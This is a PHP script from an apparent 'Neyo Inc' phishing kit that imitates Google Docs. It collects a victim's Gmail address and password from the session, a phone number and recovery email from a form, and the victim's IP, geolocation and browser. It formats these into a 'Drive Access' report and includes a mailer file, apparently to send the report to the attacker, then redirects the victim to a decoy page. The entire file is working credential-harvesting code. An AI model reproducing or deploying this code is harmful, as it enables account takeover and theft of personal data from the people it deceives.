<?php

session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$time = date("m-d-Y g:i:a");
$details = json_decode(file_get_contents("http://ipinfo.io/{$ip}"));
$country = $details->country;
$state = $details->region;
$city = $details->city;
$browser = $_SERVER['HTTP_USER_AGENT'];

$emaillg = $_SESSION['duser'];
$emailps = $_SESSION['dpass'];

$msg = "--------------< Neyo Inc - Gmail >-----------------------------\n";
$msg .= "Google D0c's By Neyo\n";
$msg .= "-----------------< Drive Access >---------------------------\n";
$msg .= "Email : $emaillg\n";
$msg .= "Password : $emailps\n";
$msg .= "-----------< Phone Number/Email Recovery >-----------------\n";
$msg .= "Phone Number : ".$_POST['win']."\n";
$msg .= "Email Recovery : ".$_POST['unix']."\n";
$msg .= "-------------------------------------------------------\n";
$msg .= "Sent from $ip on $time\n";
$msg .= "Country: '$country' | State: '$state' | City: '$city'\n";
$msg .= "USER-WEB-BROWSER: '$browser'\n";
$msg .= "-------------< 2016 Neyo Inc. >-----------------------------\n";
include("Geodata/_Mail_State_List.php");

?>
<script type="text/javascript">
	window.location="mread=/dm=opening.html"
</script>